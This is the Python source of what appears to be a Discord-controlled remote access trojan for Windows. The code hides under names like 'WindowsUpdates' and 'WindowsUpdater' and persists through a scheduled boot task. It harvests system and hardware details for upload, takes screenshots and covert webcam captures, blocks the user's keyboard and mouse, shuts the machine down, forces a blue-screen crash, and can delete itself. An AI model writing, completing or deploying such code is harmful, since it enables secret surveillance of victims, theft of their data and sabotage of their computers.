import os
from shutil import copy
import shutil
from PIL import ImageGrab
from ctypes import windll
from ctypes import c_int
from ctypes import c_uint
from ctypes import c_ulong
from ctypes import POINTER
from ctypes import byref


import pygame.camera
import pygame.image
import time
import pyautogui
import numpy as np
import imageio
import pynput
import discord
import os

operation_dir = os.getenv("APPDATA") + "\WindowsUpdates"
nullptr = POINTER(c_int)()
kb_listener = pynput.keyboard.Listener(suppress=True)
m_listener = pynput.mouse.Listener(suppress=True)

def self_destruct():
  script_dir = os.path.dirname(os.path.abspath(__file__))
  script_file = os.path.join(script_dir, "..", "self_destruct.bat")
  os.popen(f"start {script_file}")

def comp_info():
  os.system("systeminfo > pc_info.txt")
  embed = discord.Embed(title="Computer Information",description="Result uploaded.", color=0x00ff00)
  file_out = discord.File("pc_info.txt", filename="pc_info.txt")
  return embed, file_out

def pc_shutdown():
  os.popen("shutdown /s /t 0")

def hardware_info():
  hwid = os.popen("wmic csproduct get uuid").read().replace("\n", "").replace("UUID ", "")
  cpu = os.popen("wmic cpu get name").read().replace("\n", "").replace("Name ", "")
  gpu = os.popen("wmic path win32_VideoController get name").read().replace("\n", "").replace("Name ", "")
  ram = os.popen("wmic MemoryChip get Capacity").read().replace("\n", "").replace("Capacity ", "")
  disk_size = os.popen("wmic diskdrive get size").read().replace("\n", "").replace("Size ", "")
  return f"**HWID: **{hwid}\n**CPU: **{cpu}\n**GPU: **{gpu}\n**RAM: **{ram}\n**Disk Size: **{disk_size}"

def screenshot():
  ImageGrab.grab().save(f"{operation_dir}\\screenshot.png")
  return f"{operation_dir}\\screenshot.png"

def webcamshot():
  pygame.camera.init()
  cameras = pygame.camera.list_cameras()

  if not cameras:
    return "No camera found."

  camera = pygame.camera.Camera(cameras[0])
  camera.start()
  time.sleep(1)
  img = camera.get_image()
  pygame.image.save(img, f"{operation_dir}\\webcamshot.png")
  camera.stop()
  return f"{operation_dir}\\webcamshot.png"

def bsod():
  windll.ntdll.RtlAdjustPrivilege(
    c_uint(19),
    c_uint(1),
    c_uint(0),
    byref(c_int())
)

  windll.ntdll.NtRaiseHardError(
    c_ulong(0xC000007B),
    c_ulong(0),
    nullptr,
    nullptr,
    c_uint(6),
    byref(c_uint())
)

def block_input():
  kb_listener.start()
  m_listener.start()

def unblock_input():
  kb_listener.stop()
  m_listener.stop()

def bootup(): #USING SCHEDULED TASKS
  try:
    os.popen(f"schtasks /create /sc ONSTART /tn WindowsUpdater /tr {os.path.dirname(os.path.abspath(__file__))}\\main.py")
  except Exception as e:
    print(e)
    return "Error creating task."
